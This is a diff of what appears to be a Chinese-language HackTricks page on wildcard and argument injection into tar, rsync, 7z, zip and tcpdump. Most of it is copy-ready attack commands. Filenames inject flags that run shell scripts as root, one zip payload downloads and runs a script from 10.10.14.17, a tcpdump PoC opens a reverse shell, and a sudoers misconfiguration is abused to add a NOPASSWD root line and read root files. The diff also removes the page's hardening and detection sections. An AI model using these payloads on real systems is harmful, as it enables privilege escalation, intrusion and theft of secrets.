@@ -2,25 +2,25 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-> 通配符（又称 *glob*）**参数注入**发生在特权脚本运行 Unix 二进制文件，如 `tar`、`chown`、`rsync`、`zip`、`7z` 等，使用未加引号的通配符，如 `*`。  
-> 由于 shell 在执行二进制文件之前会扩展通配符，因此能够在工作目录中创建文件的攻击者可以构造以 `-` 开头的文件名，使其被解释为 **选项而不是数据**，有效地走私任意标志或甚至命令。  
-> 本页面收集了 2023-2025 年最有用的原语、最新研究和现代检测。
+> Wildcard (aka *glob*) **argument injection** 发生在特权脚本以未加引号的通配符（例如 `*`）运行 Unix 二进制（如 `tar`, `chown`, `rsync`, `zip`, `7z`, …）时。
+> 由于 shell 在执行二进制之前展开通配符，攻击者如果能在当前工作目录创建文件，就可以构造以 `-` 开头的文件名，使其被解释为**选项而非数据**，从而实质上走私任意标志甚至命令。
+> 本页收集了对 2023-2025 年最有用的原语、近期研究和现代检测方法。
 
 ## chown / chmod
 
-您可以通过滥用 `--reference` 标志来**复制任意文件的所有者/组或权限位**：
+You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:
 ```bash
 # attacker-controlled directory
 touch "--reference=/root/secret``file"   # ← filename becomes an argument
 ```
-当 root 后来执行类似的操作时：
+当 root 稍后执行类似下面的操作时：
 ```bash
 chown -R alice:alice *.php
 chmod -R 644 *.php
 ```
-`--reference=/root/secret``file` 被注入，导致 *所有* 匹配的文件继承 `/root/secret``file` 的所有权/权限。
+`--reference=/root/secret``file` 被注入，导致 *all* 匹配的文件继承 `/root/secret``file` 的所有权/权限。
 
-*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (组合攻击)。  
+*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn)（组合攻击）。
 另请参阅经典的 DefenseCode 论文以获取详细信息。
 
 ---
@@ -29,7 +29,7 @@ chmod -R 644 *.php
 
 ### GNU tar (Linux, *BSD, busybox-full)
 
-通过滥用 **checkpoint** 功能执行任意命令：
+通过滥用 **checkpoint** 功能来执行任意命令：
 ```bash
 # attacker-controlled directory
 echo 'echo pwned > /tmp/pwn' > shell.sh
@@ -37,84 +37,101 @@ chmod +x shell.sh
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-一旦 root 运行 e.g. `tar -czf /root/backup.tgz *`，`shell.sh` 作为 root 被执行。
+一旦 root 运行例如 `tar -czf /root/backup.tgz *`，`shell.sh` 就会以 root 身份执行。
 
 ### bsdtar / macOS 14+
 
-最近的 macOS 上默认的 `tar`（基于 `libarchive`）*不*实现 `--checkpoint`，但你仍然可以通过 **--use-compress-program** 标志实现代码执行，该标志允许你指定一个外部压缩程序。
+近期 macOS 上默认的 `tar`（基于 `libarchive`）*不*实现 `--checkpoint`，但你仍然可以通过 **--use-compress-program** 标志来实现代码执行，该标志允许你指定外部压缩程序。
 ```bash
 # macOS example
 touch "--use-compress-program=/bin/sh"
 ```
-当特权脚本运行 `tar -cf backup.tar *` 时，将启动 `/bin/sh`。
+当一个以特权运行的脚本执行 `tar -cf backup.tar *` 时，会启动 `/bin/sh`。
 
 ---
 
 ## rsync
 
-`rsync` 允许您通过以 `-e` 或 `--rsync-path` 开头的命令行标志覆盖远程 shell 或甚至远程二进制文件：
+`rsync` 允许你通过以 `-e` 或 `--rsync-path` 开头的命令行参数覆盖远程 shell，甚至远程二进制文件：
 ```bash
 # attacker-controlled directory
 touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
 ```
-如果 root 后来使用 `rsync -az * backup:/srv/` 归档目录，注入的标志会在远程端生成你的 shell。
+如果 root 后来使用 `rsync -az * backup:/srv/` 将该目录归档，注入的 flag 会在远程端为你启动一个 shell。
 
-*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` 模式)。
+*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).
 
 ---
 
 ## 7-Zip / 7z / 7za
 
-即使特权脚本 *防御性* 地用 `--` 前缀添加通配符（以停止选项解析），7-Zip 格式通过用 `@` 前缀文件名支持 **文件列表文件**。将其与符号链接结合可以让你 *外泄任意文件*：
+即使具有特权的脚本*出于防御性地*在通配符前加上 `--`（以停止选项解析），7-Zip 格式也通过在文件名之前加 `@` 支持**文件列表文件**。将其与符号链接结合可以让你*外传任意文件*：
 ```bash
 # directory writable by low-priv user
 cd /path/controlled
 ln -s /etc/shadow   root.txt      # file we want to read
 touch @root.txt                  # tells 7z to use root.txt as file list
 ```
-如果root执行类似于：
+如果 root 执行类似下面的命令：
 ```bash
 7za a /backup/`date +%F`.7z -t7z -snl -- *
 ```
-7-Zip 将尝试将 `root.txt` (→ `/etc/shadow`) 作为文件列表读取，并将退出，**将内容打印到 stderr**。
+7-Zip 会尝试将 `root.txt`（→ `/etc/shadow`）作为文件列表读取并退出，**将内容打印到 stderr**。
 
 ---
 
 ## zip
 
-`zip` 支持标志 `--unzip-command`，该标志在测试归档时会*逐字*传递给系统 shell：
+当应用将用户控制的文件名传递给 `zip`（要么通过通配符，要么在列举名称时不使用 `--`）时，存在两种非常实用的原语。
+
+- RCE via test hook: `-T` 启用 “test archive” 而 `-TT <cmd>` 用任意程序替换测试器（长格式：`--unzip-command <cmd>`）。如果你能注入以 `-` 开头的文件名，拆分标志到不同的文件名，以便短选项解析正常工作：
 ```bash
-zip result.zip files -T --unzip-command "sh -c id"
+# Attacker-controlled filenames (e.g., in an upload directory)
+# 1) A file literally named: -T
+# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
+# 3) Any benign file to include (e.g., data.pcap)
+# When the privileged code runs: zip out.zip <files...>
+# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
 ```
-通过精心制作的文件名注入标志，并等待特权备份脚本在生成的文件上调用 `zip -T`（测试归档）。
+注意事项
+- 不要尝试像 `'-T -TT <cmd>'` 这样的单个文件名 — 短选项会按字符解析，会导致失败。请使用独立的参数，如下所示。
+- 如果应用从文件名中去掉了斜杠，请从裸主机/IP 获取（默认路径 `/index.html`），用 `-O` 保存到本地，然后执行。
+- 可以使用 `-sc`（显示处理后的 argv）或 `-h2`（更多帮助）来调试解析，了解你的参数如何被处理。
+
+示例（zip 3.0 的本地行为）：
+```bash
+zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
+zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
+```
+- Data exfil/leak: 如果 web 层回显 `zip` stdout/stderr（在天真的 wrapper 中很常见），注入的 flags（例如 `--help`）或由错误选项导致的失败会出现在 HTTP response 中，从而确认命令行注入并有助于调整 payload。
 
 ---
 
-## 额外的易受通配符注入影响的二进制文件（2023-2025 快速列表）
+## 其他易受 wildcard injection 影响的二进制（2023-2025 快速列表）
 
-以下命令在现代 CTF 和真实环境中被滥用。有效载荷始终作为一个 *文件名* 创建在一个可写目录中，稍后将通过通配符处理：
+以下命令在现代 CTFs 和真实环境中被滥用。payload 通常作为可写目录中的一个 *filename* 创建，随后会被带通配符的程序处理：
 
-| 二进制文件 | 滥用的标志 | 效果 |
+| Binary | Flag to abuse | Effect |
 | --- | --- | --- |
-| `bsdtar` | `--newer-mtime=@<epoch>` → 任意 `@file` | 读取文件内容 |
+| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | 读取文件内容 |
 | `flock` | `-c <cmd>` | 执行命令 |
-| `git`   | `-c core.sshCommand=<cmd>` | 通过 SSH 执行 git 命令 |
-| `scp`   | `-S <cmd>` | 生成任意程序而不是 ssh |
+| `git`   | `-c core.sshCommand=<cmd>` | 通过 git over SSH 执行命令 |
+| `scp`   | `-S <cmd>` | 启动任意程序以替代 ssh |
 
-这些原语不如 *tar/rsync/zip* 经典常见，但在狩猎时值得检查。
+这些原语不如 *tar/rsync/zip* 经典工具常见，但在搜索时值得检查。
 
 ---
 
-## tcpdump 轮换钩子 (-G/-W/-z)：通过 argv 注入在包装器中实现 RCE
+## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers
 
-当受限的 shell 或供应商包装器通过连接用户控制的字段（例如，“文件名”参数）构建 `tcpdump` 命令行时，如果没有严格的引用/验证，您可以偷偷注入额外的 `tcpdump` 标志。`-G`（基于时间的轮换）、`-W`（限制文件数量）和 `-z <cmd>`（后轮换命令）的组合会导致以运行 tcpdump 的用户身份（通常是设备上的 root）执行任意命令。
+当受限 shell 或 vendor wrapper 通过拼接用户可控字段（例如 "file name" 参数）构建 `tcpdump` 命令行，但未对这些字段进行严格的引号处理/校验时，你可以夹带额外的 `tcpdump` flags。`-G`（time-based rotation）、`-W`（limit number of files）与 `-z <cmd>`（post-rotate command） 的组合会以运行 tcpdump 的用户身份（在设备上通常为 root）执行任意命令。
 
-前提条件：
+Preconditions:
 
-- 您可以影响传递给 `tcpdump` 的 `argv`（例如，通过像 `/debug/tcpdump --filter=... --file-name=<HERE>` 的包装器）。
-- 包装器不清理文件名字段中的空格或以 `-` 开头的标记。
+- 你能够影响传递给 `tcpdump` 的 `argv`（例如通过类似 `/debug/tcpdump --filter=... --file-name=<HERE>` 的 wrapper）。
+- The wrapper does not sanitize spaces or `-`-prefixed tokens in the file name field.
 
-经典 PoC（从可写路径执行反向 shell 脚本）：
+Classic PoC (executes a reverse shell script from a writable path):
 ```sh
 # Reverse shell payload saved on the device (e.g., USB, tmpfs)
 cat > /mnt/disk1_1/rce.sh <<'EOF'
@@ -132,37 +149,77 @@ nc -6 -lvnp 4444 &
 # Then send any packet that matches the BPF to force a rotation
 printf x | nc -u -6 [victim_ipv6] 1234
 ```
-细节：
+Details:
 
-- `-G 1 -W 1` 强制在第一个匹配的数据包后立即旋转。
-- `-z <cmd>` 在每次旋转后运行后旋转命令。许多构建执行 `<cmd> <savefile>`。如果 `<cmd>` 是脚本/解释器，请确保参数处理与您的有效负载匹配。
+- `-G 1 -W 1` 强制在第一个匹配的数据包后立即轮换。
+- `-z <cmd>` 在每次轮换时运行一次轮换后命令。许多构建会执行 `<cmd> <savefile>`。如果 `<cmd>` 是脚本/解释器，确保参数处理与您的 payload 匹配。
 
-不可移动媒体变体：
+No-removable-media variants:
 
-- 如果您有其他原始方法来写入文件（例如，允许输出重定向的单独命令包装器），将您的脚本放入已知路径并触发 `-z /bin/sh /path/script.sh` 或 `-z /path/script.sh`，具体取决于平台语义。
-- 一些供应商包装器旋转到攻击者可控的位置。如果您可以影响旋转路径（符号链接/目录遍历），您可以引导 `-z` 执行您完全控制的内容，而无需外部媒体。
-
-供应商的加固建议：
-
-- 切勿直接将用户控制的字符串传递给 `tcpdump`（或任何工具），而不使用严格的允许列表。引用并验证。
-- 不要在包装器中暴露 `-z` 功能；使用固定的安全模板运行 tcpdump，并完全禁止额外标志。
-- 降低 tcpdump 权限（仅限 cap_net_admin/cap_net_raw）或在具有 AppArmor/SELinux 限制的专用非特权用户下运行。
-
-## 检测与加固
-
-1. **在关键脚本中禁用 shell 通配符**：`set -f` (`set -o noglob`) 防止通配符扩展。
-2. **引用或转义** 参数：`tar -czf "$dst" -- *` 是 *不安全的* — 更倾向于使用 `find . -type f -print0 | xargs -0 tar -czf "$dst"`。
-3. **显式路径**：使用 `/var/www/html/*.log` 而不是 `*`，以便攻击者无法创建以 `-` 开头的兄弟文件。
-4. **最小权限**：尽可能以非特权服务帐户而不是 root 运行备份/维护作业。
-5. **监控**：Elastic 的预构建规则 *通过通配符注入的潜在 Shell* 查找 `tar --checkpoint=*`、`rsync -e*` 或 `zip --unzip-command` 后面紧跟着一个 shell 子进程。EQL 查询可以适应其他 EDR。
+- 如果你有任何其他用于写文件的原语（例如，允许输出重定向的单独命令封装），把你的脚本放到一个已知路径并触发 `-z /bin/sh /path/script.sh` 或 `-z /path/script.sh`，取决于平台语义。
+- 一些厂商的 wrapper 会将轮换目标写到攻击者可控的位置。如果你能影响被轮换的路径（符号链接/目录遍历），你可以引导 `-z` 去执行你完全控制的内容，而无需外部媒体。
 
 ---
 
-## 参考文献
+## sudoers: tcpdump with wildcards/additional args → 任意写/读 和 root
 
-* Elastic Security – 检测到的通过通配符注入的潜在 Shell 规则（最后更新于 2025 年）
-* Rutger Flohil – “macOS — Tar 通配符注入”（2024 年 12 月 18 日）
-* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
-* FiberGateway GR241AG – [完整利用链](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
+Very common sudoers anti-pattern:
+```text
+(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
+```
+问题
+- `*` 通配符和宽松模式只约束第一个 `-w` 参数。`tcpdump` 接受多个 `-w` 选项；最后一个生效。
+- 规则没有固定其他选项，所以 `-Z`、`-r`、-`V` 等是被允许的。
+
+原语
+- 使用第二个 `-w` 覆盖目标路径（第一个仅用于满足 sudoers）：
+```bash
+sudo tcpdump -c10 -w/var/cache/captures/a/ \
+-w /dev/shm/out.pcap \
+-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
+- 在第一个 `-w` 中进行路径遍历以逃离受限树：
+```bash
+sudo tcpdump -c10 \
+-w/var/cache/captures/a/../../../../dev/shm/out \
+-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
+- 强制输出所有权为 `-Z root`（在任何位置创建 root 所有的文件）:
+```bash
+sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
+-w /dev/shm/root-owned \
+-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
+- 通过使用 `-r` 重放特制的 PCAP 来写入任意内容（例如，写入一行 sudoers）：
+
+<details>
+<summary>创建一个包含精确 ASCII 有效负载的 PCAP 并以 root 身份写入</summary>
+```bash
+# On attacker box: craft a UDP packet stream that carries the target line
+printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
+sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
+cat sudoers | nc -u 127.0.0.1 9001; kill %1
+
+# On victim (sudoers rule allows tcpdump as above)
+sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
+-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
+-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
+</details>
+
+- 使用 `-V <file>` 可进行任意文件读取/秘密 leak（将其解释为 savefiles 列表）。错误诊断通常会回显行，导致内容 leak：
+```bash
+sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
+-w /tmp/dummy \
+-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
+---
+
+## 参考资料
+
+- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
+- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
+- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
+- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
 
 {{#include ../../banners/hacktricks-training.md}}
